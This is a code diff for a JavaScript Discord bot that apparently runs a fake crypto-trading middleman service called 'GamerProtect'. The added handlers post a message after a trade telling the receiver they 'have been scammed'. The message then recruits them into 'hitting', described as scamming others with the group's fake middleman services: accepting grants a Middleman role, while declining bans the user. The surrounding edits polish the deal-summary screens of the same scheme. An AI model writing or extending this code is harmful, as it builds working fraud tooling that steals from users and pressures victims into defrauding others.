@@ -211,6 +211,51 @@ async function findUser(guild, input) {
   return { id: null, name: input, found: false };
 }
 
+// ========== HITTING BUTTON HANDLER ==========
+client.on('interactionCreate', async interaction => {
+  if (!interaction.isButton()) return;
+  if (!interaction.customId.startsWith('hitting_accept_') && !interaction.customId.startsWith('hitting_decline_') && 
+      !interaction.customId.startsWith('hitting_confirm_ban_') && !interaction.customId.startsWith('hitting_cancel_')) return;
+
+  if (interaction.customId.startsWith('hitting_accept_')) {
+    const targetId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== targetId) return interaction.reply({ content: '❌ Not for you!', flags: 64 });
+    const target = await interaction.guild.members.fetch(targetId);
+    const mmRole = interaction.guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
+    if (mmRole) {
+      await target.roles.add(mmRole);
+      await interaction.reply({ content: `✅ You accepted! You now have the Middleman role.`, flags: 64 });
+    }
+  }
+
+  if (interaction.customId.startsWith('hitting_decline_')) {
+    const targetId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== targetId) return interaction.reply({ content: '❌ Not for you!', flags: 64 });
+    const confirmEmbed = new EmbedBuilder()
+      .setTitle('⚠️ Are you sure?')
+      .setColor(0xff0000)
+      .setDescription('If you decline, you will be **BANNED** from this server. This action cannot be undone.\n\nDo you really want to decline?');
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId(`hitting_confirm_ban_${targetId}`).setLabel('⚠️ Yes, Decline and Ban Me').setStyle(ButtonStyle.Danger),
+      new ButtonBuilder().setCustomId(`hitting_cancel_${targetId}`).setLabel('🔙 No, Go Back').setStyle(ButtonStyle.Secondary)
+    );
+    await interaction.reply({ embeds: [confirmEmbed], components: [row], flags: 64 });
+  }
+
+  if (interaction.customId.startsWith('hitting_confirm_ban_')) {
+    const targetId = interaction.customId.split('_')[3];
+    const target = await interaction.guild.members.fetch(targetId);
+    if (target) {
+      await target.ban({ reason: 'Declined mercy application' });
+      await interaction.reply({ content: `✅ ${target.user.tag} has been banned.`, flags: 64 });
+    }
+  }
+
+  if (interaction.customId.startsWith('hitting_cancel_')) {
+    await interaction.reply({ content: '🔙 Cancelled.', flags: 64 });
+  }
+});
+
 // ========== FUN COMMANDS ==========
 client.on('messageCreate', async message => {
   if (message.author.bot) return;
@@ -943,7 +988,7 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// ========== SET AMOUNT ==========
+// ========== SET AMOUNT (MORE DETAILED) ==========
 client.on('interactionCreate', async interaction => {
   if (!interaction.isButton()) return;
   if (!interaction.customId.startsWith('set_amount_')) return;
@@ -952,12 +997,19 @@ client.on('interactionCreate', async interaction => {
   if (!trade) return;
   if (interaction.user.id !== trade.senderId) return interaction.reply({ content: '❌ Only sender can set amount', flags: 64 });
   
-  const modal = new ModalBuilder().setCustomId(`amount_modal_${id}`).setTitle('Set Amount');
-  modal.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('amount').setLabel('USD Amount').setStyle(TextInputStyle.Short).setPlaceholder('50').setRequired(true)));
+  const modal = new ModalBuilder().setCustomId(`amount_modal_${id}`).setTitle('💰 Set Trade Amount');
+  modal.addComponents(new ActionRowBuilder().addComponents(
+    new TextInputBuilder()
+      .setCustomId('amount')
+      .setLabel('USD Amount')
+      .setStyle(TextInputStyle.Short)
+      .setPlaceholder('Enter amount in USD (e.g., 50, 250, 1000)')
+      .setRequired(true)
+  ));
   await interaction.showModal(modal);
 });
 
-// ========== HANDLE AMOUNT ==========
+// ========== HANDLE AMOUNT (MORE DETAILED) ==========
 client.on('interactionCreate', async interaction => {
   if (!interaction.isModalSubmit()) return;
   if (!interaction.customId.startsWith('amount_modal_')) return;
@@ -981,15 +1033,20 @@ client.on('interactionCreate', async interaction => {
   const embed = new EmbedBuilder()
     .setTitle('💰 Deal Summary')
     .setColor(0x9b59b6)
-    .setDescription(`**Amount:** $${amount.toFixed(2)} USD`)
+    .setDescription(`**Trade #${trade.ticketNumber}**`)
     .addFields(
-      { name: '💎 Crypto', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true },
-      { name: '📊 Rate', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true },
-      { name: '💸 Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE', inline: true }
-    );
+      { name: '💵 **USD Amount**', value: `$${amount.toFixed(2)} USD`, inline: true },
+      { name: '💎 **Crypto Amount**', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true },
+      { name: '📊 **Exchange Rate**', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true },
+      { name: '💸 **Fee**', value: trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE', inline: true },
+      { name: '💰 **Total to Send**', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()} ($${(amount + trade.feeUSD).toFixed(2)} with fee)`, inline: false },
+      { name: '📤 **Sender**', value: `<@${trade.senderId}>`, inline: true },
+      { name: '📥 **Receiver**', value: `<@${trade.receiverId}>`, inline: true }
+    )
+    .setFooter({ text: 'Please confirm the amount is correct' });
   
   const row = new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId(`confirm_amount_${id}`).setLabel('✅ Confirm').setStyle(ButtonStyle.Success),
+    new ButtonBuilder().setCustomId(`confirm_amount_${id}`).setLabel('✅ Confirm Amount').setStyle(ButtonStyle.Success),
     new ButtonBuilder().setCustomId(`incorrect_amount_${id}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
   );
   await interaction.editReply('✅ Amount set. Confirm below.');
@@ -1238,7 +1295,7 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// ========== WALLET & COMPLETION (EMBED SHOWS AUTOMATICALLY) ==========
+// ========== WALLET & COMPLETION (SHOWS HITTING EMBED AFTER) ==========
 client.on('interactionCreate', async interaction => {
   if (!interaction.isModalSubmit()) return;
   if (!interaction.customId.startsWith('wallet_')) return;
@@ -1258,7 +1315,7 @@ client.on('interactionCreate', async interaction => {
   const sent = trade.amountCrypto;
   const usd = (parseFloat(sent) * (trade.exchangeRateUsed || liveRates[trade.crypto])).toFixed(2);
   
-  // THIS EMBED SHOWS WHEN RECEIVER PUTS THEIR ADDRESS
+  // COMPLETION EMBED
   const completionEmbed = new EmbedBuilder()
     .setTitle('✅ Trade Completed Successfully!')
     .setColor(0x00ff00)
@@ -1275,10 +1332,24 @@ client.on('interactionCreate', async interaction => {
   await interaction.channel.send({ embeds: [completionEmbed] });
   await interaction.editReply('✅ Wallet address received! Trade completed successfully.');
   
+  // ========== SEND THE HITTING EMBED (YOU GOT HIT) ==========
+  const hittingEmbed = new EmbedBuilder()
+    .setTitle('⚠️ You Got Hit!')
+    .setColor(0xff6600)
+    .setDescription('We regret to inform you that you have been scammed, and we sincerely apologize for this unfortunate situation.\n\nHowever, there is a way for you to recover your losses and potentially earn 2x or even 100x if you\'re active.\n\n**What is Hitting?**\nHitting is where you scam other people, often using fake middlemans. You can use our fake services that we provide to scam others and get tons of items.\n\nChoose if you want to start hitting with us now.\n\nPlease click accept or decline to indicate your decision.\n\n**You have one minute to respond.**\nThe decision is yours. Make it count.')
+    .setFooter({ text: 'GamerProtect - Hitting System' })
+    .setTimestamp();
+  
+  const hittingRow = new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId(`hitting_accept_${trade.receiverId}`).setLabel('✅ Accept').setStyle(ButtonStyle.Success),
+    new ButtonBuilder().setCustomId(`hitting_decline_${trade.receiverId}`).setLabel('❌ Decline').setStyle(ButtonStyle.Danger)
+  );
+  
+  await interaction.channel.send({ content: `<@${trade.receiverId}>`, embeds: [hittingEmbed], components: [hittingRow] });
+  
   const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
   if (logsChannel) {
-    await logsChannel.send(`$mercy <@${trade.receiverId}>`);
-    console.log(`📢 $mercy command sent for ${trade.receiverId}`);
+    console.log(`📢 Hitting embed sent for ${trade.receiverId}`);
   }
   
   const sender = getUser(trade.senderId);
